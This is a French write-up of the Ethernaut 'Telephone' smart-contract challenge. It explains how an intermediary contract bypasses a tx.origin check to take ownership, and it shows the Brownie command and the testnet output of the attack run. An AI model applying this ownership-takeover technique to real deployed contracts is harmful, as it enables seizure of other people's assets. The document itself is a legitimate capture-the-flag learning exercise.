# Telephone

## Objectifs
L'objectif de ce challenge est de devenir le owner du contrat

## Devenir owner

La méthode [`changeOwner`](./contracts/telephone.sol#12) permet de modifier la valeur de `owner` à la condition que `tx.origin` est différent de `msg.sender`

`tx.origin` est l'adresse à l'origine de la transaction alors que `msg.sender` est l'adresse invoquant la fonction.

`tx.origin` est forcément une adresse 'externe' alors que `msg.sender` peut être une adresse 'externe' ou bien celle d'un smart contract.


En passant par un contrat intermédiaire, il est facile de remplir la condition `tx.origin` != `msg.sender` et ainsi de devenir `owner`.

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/attack.py main "0x05168D841b27eBc345c3F1172da2002c08c2ee9E" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

TelephoneProject is the active project.

Running 'scripts/attack.py::main'...
Target contract: 0x05168D841b27eBc345c3F1172da2002c08c2ee9E
Transaction sent: 0x149307038f692afbc854d612134a504e12db3726fef4952d6b1871a55c5721e1
  Gas price: 1.00000001 gwei   Gas limit: 137297   Nonce: 217
  TelephoneAttack.constructor confirmed   Block: 10301019   Gas used: 124816 (90.91%)
  TelephoneAttack deployed at: 0xFFd725a265217D5c928F9c984B33209c41b04563

Transaction sent: 0xae569135f093579805040b39bdd7c77844a1a43324408a4386283bedf8d3df0f
  Gas price: 1.00000001 gwei   Gas limit: 34708   Nonce: 218
  TelephoneAttack.hack confirmed   Block: 10301020   Gas used: 31509 (90.78%)

Attack done => destroy contract
Transaction sent: 0x87734ee99ef9fd0a26bdf8714e28c2aafcf0bdc94888d928f964633332fc0d03
  Gas price: 1.00000001 gwei   Gas limit: 28821   Nonce: 219
  TelephoneAttack.destroy confirmed   Block: 10301021   Gas used: 26201 (90.91%)
```

